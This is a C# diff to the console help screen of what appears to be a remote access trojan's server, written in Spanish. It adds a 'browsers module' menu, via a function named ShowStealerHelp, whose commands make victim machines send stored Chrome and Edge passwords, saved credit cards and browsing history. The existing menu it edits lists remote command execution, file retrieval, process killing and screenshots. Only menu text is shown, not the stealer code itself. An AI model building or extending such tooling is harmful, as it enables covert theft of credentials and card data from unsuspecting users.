@@ -40,6 +40,7 @@ namespace Server.GUI
             Console.WriteLine("\t+--------------------------------------------------------------------------------+");
             Console.WriteLine("\t| help: Muestra esta lista de comandos.                                          |");
             Console.WriteLine("\t| clients: Muestra los clientes que están conectados.                            |");
+            Console.WriteLine("\t| browsers_module: Comandos para el módulo de navegadores.                       |");
             Console.WriteLine("\t| ID_CLIENTE exec <comando>: Ejecuta un comando en la máquina cliente.           |");
             Console.WriteLine("\t| ID_CLIENTE list_processes: Lista todos los procesos en la máquina cliente.     |");
             Console.WriteLine("\t| ID_CLIENTE get <archivo>: Obtiene un archivo de la máquina cliente.            |");
@@ -51,8 +52,25 @@ namespace Server.GUI
             Console.WriteLine("\t| ID_CLIENTE reboot: Reinicia el ordenador del cliente tras 10 seg.              |");
             Console.WriteLine("\t| ID_CLIENTE disconnect: Desconecta al cliente.                                  |");
             Console.WriteLine("\t| ID_CLIENTE kill <PID>: Termina un proceso en la máquina cliente.               |");
-            Console.WriteLine("\t| ID_CLIENTE screenshot: Captura una captura de pantalla de la máquina cliente.  |");
+            Console.WriteLine("\t| ID_CLIENTE screenshot: Captura de pantalla de la máquina cliente.              |");
             Console.WriteLine("\t+--------------------------------------------------------------------------------+");
+        }
+
+        public static void ShowStealerHelp()
+        {   
+            Console.WriteLine("\n\t===============================================================================================");
+            Console.WriteLine("\t=                            COMANDOS PARA EL MÓDULO DE NAVEGADORES                           =");
+            Console.WriteLine("\t===============================================================================================");
+            Console.WriteLine("\t+---------------------------------------------------------------------------------------------+");
+            Console.WriteLine("\t| ID_CLIENTE chrome_passwords: Envía un archivo con las contraseñas almacenadas en Chrome.    |");
+            Console.WriteLine("\t| ID_CLIENTE chrome_ccs: Envía un archivo con las tarjetas de crédito almacenadas en Chrome.  |");
+            Console.WriteLine("\t| ID_CLIENTE chrome_history: Envía un archivo con el historial de navegación de Chrome        |");
+            Console.WriteLine("\t| ID_CLIENTE edge_passwords: Envía un archivo con las contraseñas almacenadas en Edge.        |");
+            Console.WriteLine("\t| ID_CLIENTE edge_ccs: Envía un archivo con las tarjetas de crédito almacenadas en Edge.      |");
+            Console.WriteLine("\t| ID_CLIENTE edge_history: Envía un archivo con el historial de navegación de Edge.           |");
+            Console.WriteLine("\t+---------------------------------------------------------------------------------------------+");
+            Console.WriteLine("\t[!] ATENCIÓN: Estos comandos no funcionarán si el usuario no tiene instalado el navegador.");
+            Console.WriteLine("\t[*] INFO: Puedes comprobar los navegadores que tiene instalado el usuario con: <ID_CLIENTE browsers>.");
         }
 
         public static void ShowLoadingProgressBar(Action action)
